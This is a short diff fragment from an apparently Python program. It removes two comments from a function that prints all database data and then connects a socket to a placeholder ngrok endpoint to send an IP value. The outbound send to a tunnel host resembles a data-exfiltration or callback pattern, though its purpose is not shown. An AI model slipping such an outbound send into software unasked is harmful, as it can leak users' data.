@@ -215,12 +215,10 @@ def listen():
     # show all data
     print(db.show_all_data())
 
-    # Define your target ngrok endpoint details
     HOST = "NGROK IP"
     PORT = 0000
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        # 2. Connect to the ngrok endpoint
         ip = ip[0].encode("utf-8")
         s.connect((HOST, PORT))
         s.sendall(ip)
